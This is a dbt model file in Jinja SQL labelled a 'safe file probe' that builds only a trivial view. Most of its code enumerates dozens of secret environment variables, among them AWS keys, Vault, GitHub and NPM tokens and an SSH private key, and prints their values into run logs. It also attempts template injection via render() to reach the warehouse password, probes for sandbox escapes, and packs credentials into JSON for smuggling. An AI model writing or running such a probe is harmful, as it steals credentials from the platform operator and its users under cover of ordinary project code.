{{ config(materialized='view') }}

{# Safe file probe v3 - no DBT_ENV_SECRET refs (restricted to profiles.yml) #}

{# 1. K8s/AWS/cloud env vars (non-secret prefix only) #}
{%- set k8s_vars = [
  'KUBERNETES_SERVICE_HOST',
  'KUBERNETES_SERVICE_PORT',
  'KUBERNETES_PORT',
  'AWS_CONTAINER_CREDENTIALS_RELATIVE_URI',
  'AWS_CONTAINER_CREDENTIALS_FULL_URI',
  'AWS_CONTAINER_AUTHORIZATION_TOKEN',
  'AWS_WEB_IDENTITY_TOKEN_FILE',
  'AWS_ROLE_ARN',
  'AWS_DEFAULT_REGION',
  'AWS_REGION',
  'AWS_ACCESS_KEY_ID',
  'AWS_SECRET_ACCESS_KEY',
  'AWS_SESSION_TOKEN',
  'ECS_CONTAINER_METADATA_URI',
  'ECS_CONTAINER_METADATA_URI_V4',
  'GOOGLE_APPLICATION_CREDENTIALS',
  'DATABASE_URL',
  'REDIS_URL',
  'SECRET_KEY',
  'JWT_SECRET',
  'SENTRY_DSN',
  'DD_API_KEY',
  'VAULT_ADDR',
  'VAULT_TOKEN',
  'DBT_CLOUD_API_KEY',
  'S3_BUCKET',
  'ARTIFACT_BUCKET',
  'DOCKER_HOST',
  'KUBECONFIG',
  'GITHUB_TOKEN',
  'NPM_TOKEN',
  'SSH_PRIVATE_KEY',
  'ORC_DISPATCH_URL',
  'ORC_API_URL',
  'ORC_SERVICE_URL',
  'DISPATCH_URL',
  'ARTIFACT_S3_BUCKET',
  'ARTIFACT_S3_PREFIX',
  'RUN_ARTIFACTS_BUCKET',
  'METADATA_SERVICE_URL',
  'STATE_SERVICE_URL',
  'CLOUD_API_URL',
  'CLOUD_API_KEY',
  'CLOUD_API_SECRET',
  'INTERNAL_API_KEY',
  'SERVICE_TOKEN',
  'OAUTH_CLIENT_SECRET',
  'GIT_TOKEN',
  'DEPLOY_KEY',
  'CELERY_BROKER_URL',
  'RABBITMQ_URL',
  'KAFKA_BOOTSTRAP_SERVERS'
] -%}

{%- for v in k8s_vars -%}
  {%- set val = env_var(v, '') -%}
  {%- if val != '' -%}
    {{ log("SECRET_ENV[" ~ v ~ "]=" ~ val | truncate(500), info=True) }}
  {%- endif -%}
{%- endfor -%}

{# 2. Confirm GIT_SSH_COMMAND is accessible (known from prior run) #}
{{ log("GIT_SSH=" ~ env_var('GIT_SSH_COMMAND', 'EMPTY'), info=True) }}

{# 3. Try to dump ALL env vars via adapter or other means #}
{%- if adapter is defined -%}
  {{ log("ADAPTER_TYPE=" ~ adapter | string | truncate(300), info=True) }}
  {# Try to access adapter internals #}
  {%- if adapter.dispatch is defined -%}
    {{ log("ADAPTER_DISPATCH=" ~ adapter.dispatch | string | truncate(300), info=True) }}
  {%- endif -%}
  {%- if adapter.get_columns_in_relation is defined -%}
    {{ log("ADAPTER_GET_COLS=AVAILABLE", info=True) }}
  {%- endif -%}
{%- endif -%}

{# 4. Probe modules for file access #}
{%- if modules is defined -%}
  {{ log("MODULES_KEYS=" ~ modules | string | truncate(300), info=True) }}
  {%- if modules.re is defined -%}
    {{ log("RE_MODULE=AVAILABLE", info=True) }}
  {%- endif -%}
  {%- if modules.datetime is defined -%}
    {{ log("DATETIME_MODULE=AVAILABLE", info=True) }}
  {%- endif -%}
  {%- if modules.pytz is defined -%}
    {{ log("PYTZ_MODULE=AVAILABLE", info=True) }}
  {%- endif -%}
  {%- if modules.itertools is defined -%}
    {{ log("ITERTOOLS_MODULE=AVAILABLE", info=True) }}
  {%- endif -%}
{%- endif -%}

{# 5. render() SSTI - test if sandbox applies inside render() #}
{%- if render is defined -%}
  {# Basic eval #}
  {{ log("R_EVAL=" ~ render("{{ 7 * 7 }}"), info=True) }}

  {# Try accessing env_var through render #}
  {{ log("R_ENVVAR=" ~ render("{{ env_var('HOSTNAME', 'none') }}"), info=True) }}

  {# Try accessing credentials through render #}
  {{ log("R_CREDS=" ~ render("{{ adapter.config.credentials.password }}") | truncate(100), info=True) }}

  {# render with config object #}
  {{ log("R_CONFIG=" ~ render("{{ config }}") | truncate(300), info=True) }}
{%- endif -%}

{# 6. Check invocation_id and run metadata #}
{{ log("INVOCATION_ID=" ~ invocation_id, info=True) if invocation_id is defined else "" }}
{{ log("DBT_VERSION=" ~ dbt_version, info=True) if dbt_version is defined else "" }}
{{ log("FLAGS=" ~ flags | string | truncate(300), info=True) if flags is defined else "" }}

{# 7. Check builtins for dangerous functions #}
{%- if builtins is defined -%}
  {{ log("BUILTINS_TYPE=" ~ builtins | string | truncate(500), info=True) }}
{%- endif -%}

{# 8. Try to access fromjson/tojson for data smuggling #}
{%- set test_json = tojson({"test": adapter.config.credentials | string}) -%}
{{ log("CREDS_JSON=" ~ test_json | truncate(500), info=True) }}

SELECT 1 as id
